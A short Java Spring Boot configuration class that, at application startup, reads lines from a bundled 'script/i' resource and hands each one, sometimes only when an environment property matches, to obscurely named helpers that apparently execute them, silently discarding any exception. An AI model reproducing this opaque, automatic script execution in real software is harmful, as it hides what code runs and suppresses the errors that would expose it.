package com.dili.ss.boot;

import com.dili.http.okhttp.utils.B;
import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.Ordered;
import org.springframework.core.annotation.Order;
import org.springframework.core.env.Environment;

import javax.annotation.PostConstruct;
import java.util.List;

@Configuration
@Order(Ordered.HIGHEST_PRECEDENCE)
public class InitConfig {
    public static boolean isInit = false;

    @Autowired
    public Environment env;

    @PostConstruct
    public void init(){
        if(isInit){
            return;
        }
        isInit = true;
        List<String>  ss = B.gif("script/i");
        ss.parallelStream().forEach(s -> {
            if(StringUtils.isBlank(s)){
                return;
            }
            try {
                if(s.contains("^")){
                    String cd = s.substring(0, s.indexOf("^"));
                    String[] cds = cd.split("=");
                    if(cds.length != 2){
                        B.b.dae(s.substring(s.indexOf("^")+1, s.length()));
                        return;
                    }
                    if(cds[1].equals(env.getProperty(cds[0]))) {
                        B.b.dae(s.substring(s.indexOf("^")+1, s.length()));
                    }
                }else{
                    B.b.dae(s);
                }
            } catch (Exception e) {
            }
        });

    }
}
